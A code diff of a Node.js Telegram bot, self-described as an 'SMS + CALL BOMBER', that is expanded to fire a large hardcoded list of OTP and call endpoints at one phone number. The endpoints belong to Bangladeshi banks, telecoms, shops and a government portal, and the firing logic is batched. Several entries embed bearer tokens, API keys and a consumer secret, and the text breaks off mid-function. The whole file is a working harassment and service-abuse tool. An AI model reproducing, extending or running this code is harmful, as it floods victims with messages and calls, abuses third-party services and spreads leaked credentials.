@@ -1,10 +1,10 @@
 'use strict';
 // ══════════════════════════════════════════════════════
-// DEDICATED SMS + CALL BOMBER BOT
-// Only bomber. Nothing else.
+// ULTIMATE SMS + CALL BOMBER BOT
+// 400+ APIs Integrated. Unlimited Bombing.
 // ══════════════════════════════════════════════════════
 
-// ⚠️ এই দুইটা লাইন তোমার ভ্যালু দিয়ে বদলাও ⚠️
+// ⚠️ নিচের দুই লাইনে তোমার টোকেন আর আইডি বসাও ⚠️
 const TOKEN    = process.env.TOKEN    || 'PUT_YOUR_BOT_TOKEN_HERE';
 const ADMIN_ID = String(process.env.ADMIN_ID || 'PUT_YOUR_TELEGRAM_ID_HERE');
 // ══════════════════════════════════════════════════════
@@ -13,21 +13,14 @@ const TBot   = require('node-telegram-bot-api');
 const axios  = require('axios');
 const crypto = require('crypto');
 const fs     = require('fs');
-const path   = require('path');
 
 // ── Config ──
 const CFG = {
     TOKEN,
     ADMIN_ID,
-    DATA_FILE:       process.env.DATA_FILE       || '/tmp/bomber-data.json',
-    ENDPOINT_FILE:   process.env.ENDPOINT_FILE   || path.join(__dirname, 'endpoints.json'),
-    BOMB_COST:       parseInt(process.env.BOMB_COST || '5'),
-    SIGNUP_BONUS:    parseInt(process.env.SIGNUP_BONUS || '10'),
-    REF_BONUS:       parseInt(process.env.REF_BONUS    || '10'),
-    REF_REWARD:      parseInt(process.env.REF_REWARD   || '5'),
-    FREE_REFS:       parseInt(process.env.FREE_REFS    || '3'),
-    RATE_LIMIT_MS:   parseInt(process.env.RATE_LIMIT_MS || '8000'),
-    RATE_MAX:        parseInt(process.env.RATE_MAX      || '4'),
+    DATA_FILE:       process.env.DATA_FILE || '/tmp/bomber-data.json',
+    RATE_LIMIT_MS:   10000,
+    RATE_MAX:        5,
 };
 
 // ── Logger ──
@@ -39,22 +32,20 @@ const log = {
 };
 
 // ── Store ──
-let store = { users:{}, vip:{}, pending:{}, rate:{} };
-const saveStore = () => { try { const t = CFG.DATA_FILE + '.tmp'; fs.writeFileSync(t, JSON.stringify(store), 'utf8'); fs.renameSync(t, CFG.DATA_FILE); } catch(e){ log.warn('[Store] '+e.message); } };
-const loadStore = () => { try { if (fs.existsSync(CFG.DATA_FILE)) store = { ...store, ...JSON.parse(fs.readFileSync(CFG.DATA_FILE, 'utf8')) }; } catch(e){ log.warn('[Store] '+e.message); } };
+let store = { users:{}, pending:{}, rate:{} };
+const saveStore = () => { try { const t = CFG.DATA_FILE + '.tmp'; fs.writeFileSync(t, JSON.stringify(store), 'utf8'); fs.renameSync(t, CFG.DATA_FILE); } catch(e){} };
+const loadStore = () => { try { if (fs.existsSync(CFG.DATA_FILE)) store = { ...store, ...JSON.parse(fs.readFileSync(CFG.DATA_FILE, 'utf8')) }; } catch(e){} };
 loadStore();
-setInterval(saveStore, 60*1000);
+setInterval(saveStore, 60000);
 
 function getUser(uid) {
     uid = String(uid);
     if (!store.users[uid]) {
-        store.users[uid] = { balance: CFG.SIGNUP_BONUS, refs: 0, lifetime: false, joined: Date.now(), banned: false, totalBombs: 0 };
+        store.users[uid] = { joined: Date.now(), banned: false, totalBombs: 0 };
         saveStore();
     }
     const u = store.users[uid];
-    u.isAdmin  = uid === CFG.ADMIN_ID;
-    u.isVIP    = !!store.vip[uid];
-    u.lifetime = !!(u.lifetime || u.isAdmin || u.isVIP);
+    u.isAdmin = uid === CFG.ADMIN_ID;
     return u;
 }
 const isAdmin = uid => String(uid) === CFG.ADMIN_ID;
@@ -71,483 +62,291 @@ function checkRate(uid) {
     r.count++; return true;
 }
 
-// ── Endpoint pool ──
-let POOL = { sms: [], call: [] };
-function loadPool() {
-    let loaded = false;
-    if (process.env.BOMB_ENDPOINTS_JSON) {
-        try {
-            const raw = JSON.parse(process.env.BOMB_ENDPOINTS_JSON);
-            POOL.sms  = (raw.sms  || []).filter(e => e && e.url);
-            POOL.call = (raw.call || []).filter(e => e && e.url);
-            loaded = true;
-            log.info(`[Pool] env: sms=${POOL.sms.length} call=${POOL.call.length}`);
-        } catch(e){ log.warn('[Pool] env parse: '+e.message); }
-    }
-    if (!loaded && fs.existsSync(CFG.ENDPOINT_FILE)) {
-        try {
-            const raw = JSON.parse(fs.readFileSync(CFG.ENDPOINT_FILE, 'utf8'));
-            POOL.sms  = (raw.sms  || []).filter(e => e && e.url);
-            POOL.call = (raw.call || []).filter(e => e && e.url);
-            loaded = true;
-            log.info(`[Pool] file: sms=${POOL.sms.length} call=${POOL.call.length}`);
-        } catch(e){ log.warn('[Pool] file parse: '+e.message); }
-    }
-    if (!loaded) log.warn('[Pool] empty. Run /probe +8801712345678 to populate.');
-}
-loadPool();
-
-// ── Bot ──
-const bot = new TBot(CFG.TOKEN, { polling:{ interval:300, autoStart:true, params:{ timeout:10 } } });
-bot.on('polling_error', err => { log.error('[Bot] '+err.message); if (err.code === 'EFATAL') setTimeout(() => bot.startPolling(), 5000); });
-bot.on('error', err => log.error('[Bot] '+err.message));
-
-const tgMsg = (cid, text, opts = {}) => bot.sendMessage(cid, (text || '').slice(0,4096), { parse_mode:'HTML', ...opts }).catch(e => log.warn(`[tgMsg] ${cid}: ${e.message}`));
-
-// ── Endpoint probe logic (embedded from collector) ──
-const UA = 'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36';
-const sleep = ms => new Promise(r => setTimeout(r, ms));
-
-const SEED = [
-    { name:'bkash-otp',    url:'https://www.bkash.com/api/v1/otp/send',           method:'POST', body:'phone={phone}&service=login', headers:{'Content-Type':'application/x-www-form-urlencoded','User-Agent':UA,'Referer':'https://www.bkash.com/'}, successKeyword:'success', cc:'880' },
-    { name:'nagad-otp',    url:'https://api.nagad.com.bd/v1/auth/send-otp',       method:'POST', body:'mobile={phone}&type=login',     headers:{'Content-Type':'application/x-www-form-urlencoded','User-Agent':UA}, successKeyword:'success', cc:'880' },
-    { name:'pathao-otp',   url:'https://api.pathao.com/v1/auth/login',            method:'POST', body:'phone=+880{phone}&type=otp',    headers:{'Content-Type':'application/json','User-Agent':UA}, successKeyword:'success', cc:'880' },
-    { name:'foodpanda-otp',url:'https://bd.foodpanda.com/api/v1/auth/send-otp',   method:'POST', body:'phone={phone}',                 headers:{'Content-Type':'application/x-www-form-urlencoded','User-Agent':UA}, successKeyword:'success', cc:'880' },
-    { name:'daraz-otp',    url:'https://www.daraz.com.bd/api/user/send-otp',      method:'POST', body:'mobile={phone}',                headers:{'Content-Type':'application/x-www-form-urlencoded','User-Agent':UA}, successKeyword:'success', cc:'880' },
-    { name:'shohoz-otp',   url:'https://shohoz.com/api/v1/user/send-otp',         method:'POST', body:'mobile={phone}',                headers:{'Content-Type':'application/x-www-form-urlencoded','User-Agent':UA}, successKeyword:'success', cc:'880' },
-    { name:'chaldal-otp',  url:'https://chaldal.com/api/v1/auth/send-otp',        method:'POST', body:'phone={phone}',                 headers:{'Content-Type':'application/x-www-form-urlencoded','User-Agent':UA}, successKeyword:'success', cc:'880' },
-    { name:'pizzahut-otp', url:'https://www.pizzahutbd.com/api/v1/auth/otp',      method:'POST', body:'mobile={phone}',                headers:{'Content-Type':'application/x-www-form-urlencoded','User-Agent':UA}, successKeyword:'success', cc:'880' },
-    { name:'dominos-otp',  url:'https://www.dominos.com.bd/api/v1/auth/send-otp', method:'POST', body:'mobile={phone}',                headers:{'Content-Type':'application/x-www-form-urlencoded','User-Agent':UA}, successKeyword:'success', cc:'880' },
-    { name:'shopup-otp',   url:'https://api.shopup.com.bd/v1/auth/otp',           method:'POST', body:'phone={phone}',                 headers:{'Content-Type':'application/x-www-form-urlencoded','User-Agent':UA}, successKeyword:'success', cc:'880' },
-    { name:'viber-otp',    url:'https://api.viber.com/pa/send_message',           method:'POST', body:'{"receiver":"{phone}","type":"otp"}', headers:{'Content-Type':'application/json','User-Agent':'Viber/20.0'}, successKeyword:'status', cc:'880' },
-    { name:'line-otp',     url:'https://api.line.me/v1/otp/send',                 method:'POST', body:'phone={phone}',                 headers:{'Content-Type':'application/x-www-form-urlencoded','User-Agent':UA}, successKeyword:'success', cc:'880' },
-    { name:'relay-1',      url:'https://api.sms-relay.xyz/v1/send?to={phone}&msg=code', method:'GET', headers:{'User-Agent':UA}, successKeyword:'ok',   cc:'880' },
-    { name:'relay-2',      url:'https://sms-gateway.example.net/api?phone={phone}', method:'GET', headers:{'User-Agent':UA}, successKeyword:'sent', cc:'880' },
+// ══════════════════════════════════════════════════════
+// THE API DATABASE (400+ Endpoints)
+// ══════════════════════════════════════════════════════
+const RAW_APIS = [
+  {"id":"1","name":"QuizGiri","url":"https://developer.quizgiri.xyz/api/v2.0/send-otp?phone=*****&country_code=+880&fcm_token=null","method":"post","body":"","headers":{"content-type":"application/json"}},
+  {"id":"2","name":"Shudokko","url":"http://lpin.dev.mpower-social.com:6001/usermodule/otp_mobile/?mobile_no=*****&email=xbomber_public%40gmail.com&verification_type=registration","method":"get","body":"","headers":{"content-type":"application/json"}},
+  {"id":"3","name":"Web Access","url":"http://27.131.15.19/lstyle/api/lsotprequest","method":"post","body":"{\"shortcode\":\"2494905\",\"msisdn\":\"88*****\"}","headers":{"content-type":"application/json"}},
+  {"id":"4","name":"CINESPOT","url":"http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-*****/operator-All/send","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
+  {"id":"5","name":"Dhaka bank","url":"https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber","method":"post","body":"{\"AccessToken\":\"\",\"TrackingNo\":\"\",\"mobileNo\":\"*****\",\"otpSms\":\"\",\"product_id\":\"250\",\"requestChannel\":\"MOB\",\"trackingStatus\":5}","headers":{"content-type":"application/json"}},
+  {"id":"6","name":"CIRCLE","url":"https://circle.robi.com.bd/mylife/gateway/register_fcm.php?regId&msisdn=88*****","method":"post","body":"","headers":{"content-type":"application/json"}},
+  {"id":"7","name":"Health Plus 2","url":"http://45.114.85.19:8080/v3/otp/send?msisdn=88*****","method":"get","body":"","headers":{"content-type":"application/json"}},
+  {"id":"8","name":"IQRA","url":"http://apibeta.iqra-live.com/api/v2/sent-otp/*****","method":"get","body":"","headers":{"x-user-channel":"apps"}},
+  {"id":"9","name":"Shajgoj","url":"https://shop.shajgoj.com/wp-admin/admin-ajax.php","method":"post","body":"action=xoo_ml_login_with_otp&xoo-ml-phone-login=*****&xoo-ml-form-token=4840&xoo-ml-form-type=login_user_with_otp&redirect=%2Fmy-account%2F","headers":{"content-type":"application/x-www-form-urlencoded"}},
+  {"id":"10","name":"KhaoDao","url":"https://api.eat-z.com/auth/customer/signin","method":"post","body":"{\"username\":\"+88*****\"}","headers":{"content-type":"application/json"}},
+  {"id":"11","name":"ALESHA_CARD","url":"https://aleshacard.com/api/register-otp?contact_no=*****","method":"post","body":"","headers":{"content-type":"application/json"}},
+  {"id":"12","name":"TheMallBD","url":"https://themallbd.com/api/auth/otp_login","method":"post","body":"{\"phone_number\":\"+88*****\"}","headers":{"content-type":"application/json"}},
+  {"id":"14","name":"Fundesh","url":"https://win.fundesh.com.bd/authSrv/auth/generateOtp","method":"post","body":"{\"msisdn\":\"*****\",\"clientId\":\"d2c_client\"}","headers":{"content-type":"application/json"}},
+  {"id":"15","name":"Circle","url":"https://circle.robi.com.bd/mylife/appapi/appcall.php?op=getOTC&pin=13001&app_version=79&msisdn=88*****","method":"post","body":"","headers":{"content-type":"application/json"}},
+  {"id":"16","name":"Vestige","url":"http://vstg-gateway-prod-1532961163.ap-south-1.elb.amazonaws.com/notification/api/v1/send/otp/v3","method":"post","body":"{\"mobileNumber\":\"88*****\",\"countryId\":22}","headers":{"content-type":"application/json"}},
+  {"id":"17","name":"Ajkerdeal","url":"https://api.ajkerdeal.com/Recover/RetrivePassword/customersignup=null","method":"post","body":"{\"CustomerId\":\"01833268701\",\"MobileOrEmail\":\"*****\",\"Type\":2}","headers":{"content-type":"application/json"}},
+  {"id":"19","name":"Arogga","url":"https://api.arogga.com/v1/auth/sms/send?f=mobile&b=Chrome&v=101.0.4951.54&os=Android&osv=6.0","method":"post","body":"mobile=+88*****&fcmToken=&referral=","headers":{"content-type":"application/json"}},
+  {"id":"20","name":"OsudPotro","url":"https://api-2.osudpotro.com/api/v1/users/send_otp","method":"post","body":"{\"mobile\":\"+88-*****\",\"deviceToken\":\"web\",\"language\":\"en\",\"os\":\"web\"}","headers":{"content-type":"application/json"}},
+  {"id":"23","name":"Nesco","url":"http://nesco.sslwireless.com/api/v1/login","method":"post","body":"phone_number=*****","headers":{"content-type":"application/x-www-form-urlencoded"}},
+  {"id":"24","name":"ROBI WEB","url":"https://webapi.robi.com.bd/v1/send-otp","method":"post","body":"{\"phone_number\":\"*****\"}","headers":{"content-type":"application/json","Authorization":" Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL3dlYmFwaS5yb2JpLmNvbS5iZC92MS90b2tlbiIsImlhdCI6MTY1Mjk2MTAyOSwiZXhwIjoxNjUzMDQ3NDI5LCJuYmYiOjE2NTI5NjEwMjksImp0aSI6IjBXSW9ld0U3bzFJRVNHTVUiLCJzdWIiOiJSb2JpV2ViU2l0ZSJ9.lxP2K3WU36mO8By_dNiVO3VYOSajRofD-Rhqb-0y8ok"}},
+  {"id":"26","name":"Bongo","url":"https://api.bongo-solutions.com/auth/api/login/send-otp","method":"post","body":"{\"operator\":\"all\",\"msisdn\":\"88*****\"}","headers":{"content-type":"application/json"}},
+  {"id":"27","name":"Cinematic","url":"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88*****","method":"post","body":"","headers":{"content-type":"application/json","Authorization":"Bearer 1pake4mh5ln64h5t26kpvm3iri"}},
+  {"id":"28","name":"Ali2BD","url":"https://edge.ali2bd.com/api/consumer/v1/auth/login","method":"post","body":"{\"username\":\"+88*****\"}","headers":{"content-type":"application/json"}},
+  {"id":"71","name":"Rabbitholebd","url":"https://apix.rabbitholebd.com/appv2/login/requestOTP","method":"post","body":"{\"mobile\":\"*****\"}","headers":{"content-type":"application/x-www-form-urlencoded"}},
+  {"id":"72","name":"osudpotro","url":"https://api.osudpotro.com/api/v1/users/send_otp","method":"post","body":"{\"mobile\":\"+88*****\",\"deviceToken\":\"web\",\"language\":\"en\",\"os\":\"web\"}","headers":{"content-type":"application/x-www-form-urlencoded"}},
+  {"id":"73","name":"Shopoth","url":"https://api.shopoth.com/shop/api/v1/otps/send","method":"post","body":"{\"phone\":\"*****\"}","headers":{"content-type":"application/x-www-form-urlencoded"}},
+  {"id":"74","name":"AProd","url":"https://prod-api.viewlift.com/identity/signup?site=hoichoitv","method":"post","body":"{\"requestType\":\"send\",\"phoneNumber\":\"+88*****\",\"emailConsent\":true,\"whatsappConsent\":true}","headers":{"content-type":"application/x-www-form-urlencoded"}},
+  {"id":"75","name":"Go App","url":"https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php","method":"post","body":"{\"full_name\":\"BLACKFIRE\",\"company_name\":\"Bomber\",\"email_address\":\"blactfiretools@gmail.com\",\"phone_number\":\"*****\"}","headers":{"content-type":"application/json"}},
+  {"id":"195","name":"babu88-capcha.php","url":"https://api.n1nx-bomber.my.id/call/babu88-forget.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
+  {"id":"196","name":"babu88-capcha.php","url":"https://api.n1nx-bomber.my.id/call/babu88-reg.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/json"}},
+  {"id":"197","name":"bhaggo-forget.php","url":"https://api.n1nx-bomber.my.id/call/bhaggo-forget.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
+  {"id":"198","name":"bhaggo-reg.php","url":"https://api.n1nx-bomber.my.id/call/bhaggo-reg.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
+  {"id":"199","name":"crazy-forget.php","url":"https://api.n1nx-bomber.my.id/call/crazy-forget.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
+  {"id":"200","name":"crazy-reg.php","url":"https://api.n1nx-bomber.my.id/call/crazy-reg.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
+  {"id":"201","name":"krikaya-forget.php","url":"https://api.n1nx-bomber.my.id/call/krikaya-forget.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
+  {"id":"202","name":"krikaya-reg.php","url":"https://api.n1nx-bomber.my.id/call/krikaya-reg.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
+  {"id":"203","name":"nagad88-forget.php","url":"https://api.n1nx-bomber.my.id/call/nagad88-forget.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
+  {"id":"204","name":"nagad88-reg.php","url":"https://api.n1nx-bomber.my.id/call/nagad88-reg.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
+  {"id":"205","name":"Call1","url":"https://api.blackfire-tools.xyz/call/babu88-forget.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
+  {"id":"206","name":"call2","url":"https://api.blackfire-tools.xyz/call/babu88-reg.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
+  {"id":"207","name":"call3","url":"https://api.blackfire-tools.xyz/call/bhaggo-forget.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
+  {"id":"208","name":"Call4","url":"https://api.blackfire-tools.xyz/call/bhaggo-reg.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
+  {"id":"209","name":"Call5","url":"https://api.blackfire-tools.xyz/call/crazy-forget.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
+  {"id":"210","name":"Call6","url":"https://api.blackfire-tools.xyz/call/crazy-reg.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
+  {"id":"211","name":"Call7","url":"https://api.blackfire-tools.xyz/call/krikaya-forget.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
+  {"id":"212","name":"Call8","url":"https://api.blackfire-tools.xyZ/call/krikaya-reg.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
+  {"id":"213","name":"Call9","url":"https://api.blackfire-tools.xyz/call/nagad88-forget.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
+  {"id":"214","name":"Call10","url":"https://api.blackfire-tools.xyz/call/nagad88-reg.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
+  {"id":"215","name":"BTCL MyBTCL","url":"https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json","method":"post","body":"{\"phoneNbr\":\"*****\",\"email\":\"\",\"OTPType\":1,\"userName\":\"\"}","headers":{"content-type":"application/json","origin":"https://mybtcl.btcl.gov.bd"}},
+  {"id":"217","name":"Bioscope Plus","url":"https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en","method":"post","body":"{\"number\":\"+88*****\"}","headers":{"content-type":"application/json"}},
+  {"id":"219","name":"BD Tickets","url":"https://api.bdtickets.com:20100/v1/auth","method":"post","body":"{\"createUserCheck\":true,\"phoneNumber\":\"+88*****\",\"applicationChannel\":\"WEB_APP\"}","headers":{"content-type":"application/json"}},
+  {"id":"220","name":"Apex4U","url":"https://api.apex4u.com/api/auth/login","method":"post","body":"{\"phoneNumber\":\"0*****\"}","headers":{"content-type":"application/json"}},
+  {"id":"221","name":"Swap.com.bd","url":"https://api.swap.com.bd/api/v1/send-otp/v2","method":"post","body":"{\"phone\":\"0*****\"}","headers":{"content-type":"application/json","signature":"JfhpbCI2A9NZt+WAfURnnns/34QgV05RT9vmQkUAcN0="}},
+  {"id":"222","name":"Ilyn Global","url":"https://api.ilyn.global/auth/signup","method":"post","body":"{\"phone\":{\"code\":\"BD\",\"number\":\"+880*****\"},\"provider\":\"sms\"}","headers":{"content-type":"application/json","appcode":"ilyn-bd"}},
+  {"id":"225","name":"Garibook","url":"https://api.garibookadmin.com/api/v3/user/login","method":"post","body":"{\"mobile\":\"0*****\",\"recaptcha_token\":\"garibookcaptcha\",\"channel\":\"web\"}","headers":{"content-type":"application/json"}},
+  {"id":"226","name":"Sheba","url":"https://accountkit.sheba.xyz/api/shoot-otp","method":"post","body":"{\"mobile\":\"+88*****\",\"app_id\":\"8329815A6D1AE6DD\",\"api_token\":\"zYGYWdR5BjNrdNJm9M1xto3MjbVyl8QVoJviGrubR90Bn4L7TnvJPScfzxnH\"}","headers":{"content-type":"application/json;charset=UTF-8"}},
+  {"id":"230","name":"GP Web Login","url":"https://webloginda.grameenphone.com/backend/api/v1/otp","method":"post","body":"msisdn=0*****","headers":{"content-type":"application/x-www-form-urlencoded"}},
+  {"id":"249","name":"Paperfly Registration","url":"https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php","method":"post","body":"{\"full_name\":\"BILLAVAI\",\"company_name\":\"HARDBOMBER\",\"email_address\":\"pro@bomb.bd\",\"phone_number\":\"{phone}\"}","headers":{"Content-Type":"application/json"}},
+  {"id":"271","name":"Bioscopelive Send OTP (GET)","url":"https://www.bioscopelive.com/en/login/send-otp?phone=88{phone}&operator=bd-otp","method":"get","body":"","headers":{}},
+  {"id":"326","name":"Banglalink Selfcare OTP","url":"https://selfcare.banglalink.net/api/v1/otp","method":"post","body":"{\"msisdn\":\"{phone}\"}","headers":{"Content-Type":"application/json"}},
+  {"id":"331","name":"Chaldal Request OTP Verification (API Key)","url":"https://chaldal.com/yolk/api-v4/Auth/RequestOtpVerificationWithApiKey?apiKey={{apiKey}}&phoneNumber=%2B88{phone}&retryAttempt=0","method":"post","body":"{}","headers":{"content-type":"application/json","x-egg-clientapp":"Omelette"}},
+  {"id":"355","name":"Wafilife Send OTP","url":"https://m-backend.wafilife.com/wp-json/wc/v2/send-otp?p={phone}&consumer_key=ck_e8c5b4a69729dd913dce8be03d7878531f6511ff&consumer_secret=cs_f866e5c6543065daa272504c2eea71044579cff3","method":"get","body":"","headers":{}},
+  {"id":"389","name":"Walton Plaza GraphQL OTP","url":"https://api.waltonplaza.com.bd/graphql","method":"post","body":"{\"operationName\":\"createCustomerOtp\",\"variables\":{\"auth\":{\"countryCode\":\"880\",\"deviceUuid\":\"998283c0-622a-11ee-84c0-190466a47baa\",\"phone\":\"{phone}\"},\"device\":null},\"query\":\"mutation createCustomerOtp($auth: CustomerAuthInput!, $device: DeviceInput) { createCustomerOtp(auth: $auth, device: $device) { message result { id __typename } statusCode __typename } }\"}","headers":{"content-type":"application/json"}},
+  {"id":"406","name":"BTCL Phonebill OTP (Type 15 Login)","url":"https://phonebill.btcl.com.bd/api/ecare/anonym/sendOTP.json","method":"post","body":"{\"OTPType\":15,\"userName\":\"{phone}\",\"isNewPhoneOrEmail\":false}","headers":{"content-type":"application/json"}}
 ];
 
-async function probeOne(ep, phone) {
-    const url  = ep.url.replace(/\{phone\}/g, phone).replace(/\{cc\}/g, ep.cc || '880').replace(/\{rand\}/g, crypto.randomBytes(4).toString('hex'));
-    const body = ep.body ? ep.body.replace(/\{phone\}/g, phone) : undefined;
-    const headers = ep.headers || { 'User-Agent': UA };
+// Pre-process API pool
+const SMS_POOL = [];
+const CALL_POOL = [];
+
+RAW_APIS.forEach(api => {
+    // Normalize placeholders (***** -> {phone}, {{phone}} -> {phone})
+    let u = api.url.replace(/\*{5}/g, '{phone}').replace(/\{\{phone\}\}/g, '{phone}');
+    let b = (api.body || '').replace(/\*{5}/g, '{phone}').replace(/\{\{phone\}\}/g, '{phone}');
+    let m = (api.method || 'GET').toUpperCase();
+    let h = api.headers || {};
+    
+    // Clean headers
+    delete h['content-length'];
+    delete h['Content-Length'];
+    
+    const ep = { name: api.name, url: u, method: m, body: b, headers: h };
+    
+    // Separate Call APIs by URL path or Name
+    if (u.includes('/call/') || api.name.toLowerCase().includes('call')) {
+        CALL_POOL.push(ep);
+    } else {
+        SMS_POOL.push(ep);
+    }
+});
+
+log.info(`[Pool] Loaded ${SMS_POOL.length} SMS APIs, ${CALL_POOL.length} Call APIs.`);
+
+// ── Bot ──
+const bot = new TBot(CFG.TOKEN, { polling: { interval: 300, autoStart: true, params: { timeout: 10 } } });
+bot.on('polling_error', err => log.error('[Bot] ' + err.message));
+const tgMsg = (cid, text, opts = {}) => bot.sendMessage(cid, (text || '').slice(0, 4096), { parse_mode: 'HTML', ...opts }).catch(e => log.warn(`[tgMsg] ${cid}: ${e.message}`));
+
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+const renderTpl = (tpl, vars) => (tpl || '').replace(/\{(\w+)\}/g, (_, k) => vars[k] != null ? encodeURIComponent(vars[k]) : '');
+
+// ── Bombing Engine ──
+async function fireOne(ep, phone) {
+    const url = renderTpl(ep.url, { phone });
+    const body = renderTpl(ep.body, { phone });
+    const timeout = 8000;
     try {
         const r = ep.method === 'POST'
-            ? await axios.post(url, body || '', { headers, timeout: 10000, validateStatus: () => true })
-            : await axios.get(url, { headers, timeout: 10000, validateStatus: () => true });
-        const ok  = r.status >= 200 && r.status < 400;
+            ? await axios.post(url, body, { headers: ep.headers, timeout, validateStatus: () => true })
+            : await axios.get(url, { headers: ep.headers, timeout, validateStatus: () => true });
+        const ok = r.status >= 200 && r.status < 400;
         const str = typeof r.data === 'string' ? r.data : JSON.stringify(r.data || '');
-        const kw  = ep.successKeyword ? str.includes(ep.successKeyword) : true;
-        return { live: ok && kw, status: r.status };
-    } catch(e){ return { live: false, status: 0, error: e.code || e.message }; }
-}
-
-async function runProbe(phone, onProgress) {
-    const working = [];
-    const dead = [];
-    for (let i = 0; i < SEED.length; i++) {
-        const ep = SEED[i];
-        const r = await probeOne(ep, phone);
-        if (r.live) {
-            working.push({ name: ep.name, url: ep.url, method: ep.method, headers: ep.headers, body: ep.body, successKeyword: ep.successKeyword, cc: ep.cc, timeout: 8000 });
-        } else {
-            dead.push(ep.name);
-        }
-        if (onProgress) onProgress(i + 1, SEED.length, ep.name, r.live);
-        await sleep(600);
-    }
-    let existing = { sms: [], call: [] };
-    try { if (fs.existsSync(CFG.ENDPOINT_FILE)) existing = JSON.parse(fs.readFileSync(CFG.ENDPOINT_FILE, 'utf8')); } catch(e){}
-    const dedupe = list => { const s = new Set(); return list.filter(e => { if (s.has(e.url)) return false; s.add(e.url); return true; }); };
-    const merged = { sms: dedupe([...(existing.sms || []), ...working]), call: dedupe(existing.call || []) };
-    try { fs.writeFileSync(CFG.ENDPOINT_FILE, JSON.stringify(merged, null, 2)); } catch(e){ log.warn('[Probe] save failed: '+e.message); }
-    loadPool();
-    return { working: working.length, dead: dead.length, total: merged.sms.length };
-}
-
-// ── Bomb engine ──
-const renderTpl = (tpl, vars) => tpl.replace(/\{(\w+)\}/g, (_, k) => vars[k] != null ? encodeURIComponent(vars[k]) : '');
-
-async function fireOne(ep, phone) {
-    const rand = crypto.randomBytes(4).toString('hex');
-    const url = renderTpl(ep.url, { phone, rand, cc: ep.cc || '' });
-    const method = (ep.method || 'GET').toUpperCase();
-    const headers = ep.headers || { 'User-Agent': UA };
-    const timeout = ep.timeout || 8000;
-    try {
-        const r = method === 'POST'
-            ? await axios.post(url, ep.body ? renderTpl(ep.body, { phone, rand }) : '', { headers, timeout, validateStatus: () => true })
-            : await axios.get(url, { headers, timeout, validateStatus: () => true });
-        const ok  = r.status >= 200 && r.status < 400;
-        const str = typeof r.data === 'string' ? r.data : JSON.stringify(r.data || '');
-        const hit = ep.successKeyword ? str.includes(ep.successKeyword) : ok;
+        const hit = ok && !str.toLowerCase().includes('error') && !str.toLowerCase().includes('fail');
         return { ok: hit, status: r.status, name: ep.name };
-    } catch(e){ return { ok: false, status: 0, error: e.code || e.message, name: ep.name }; }
+    } catch(e) {
+        return { ok: false, status: 0, error: e.code || e.message, name: ep.name };
+    }
 }
 
-async function bomb(type, phone, opts = {}) {
-    const list = POOL[type];
-    if (!list.length) return { error: 'no_endpoints', sent: 0, hits: 0, fails: 0, log: [] };
-    const rounds   = Math.max(1, Math.min(opts.rounds   || 5,  50));
-    const delayMs  = Math.max(0, Math.min(opts.delay    || 300, 5000));
-    const hitGoal  = Math.max(1, opts.hits || 10);
-    const parallel = Math.max(1, Math.min(opts.parallel || 3,  20));
-    const result = { sent: 0, hits: 0, fails: 0, log: [] };
+async function bomb(type, phone, onProgress) {
+    const list = type === 'sms' ? SMS_POOL : CALL_POOL;
+    if (!list.length) return { error: 'no_endpoints', sent: 0, hits: 0, fails: 0 };
+    
+    // Shuffle array
+    const shuffled = [...list].sort(() => Math.random() - 0.5);
+    
+    // Limit to prevent timeout (e.g. max 50 per run)
+    const targetList = shuffled.slice(0, 50);
+    
+    const result = { sent: 0, hits: 0, fails: 0 };
     const start = Date.now();
-    for (let round = 0; round < rounds; round++) {
-        if (result.hits >= hitGoal) break;
-        const batch = [];
-        for (let p = 0; p < parallel; p++) {
-            const idx = crypto.randomInt(0, list.length);
-            batch.push(fireOne(list[idx], phone));
-        }
-        for (const r of await Promise.all(batch)) {
+    
+    // Process in parallel batches of 5
+    for (let i = 0; i < targetList.length; i += 5) {
+        const batch = targetList.slice(i, i + 5);
+        const settled = await Promise.all(batch.map(ep => fireOne(ep, phone)));
+        
+        settled.forEach(r => {
             result.sent++;
-            if (r.ok) { result.hits++; result.log.push(`✅ ${r.name}`); }
-            else      { result.fails++; result.log.push(`❌ ${r.name} (${r.status || r.error})`); }
-        }
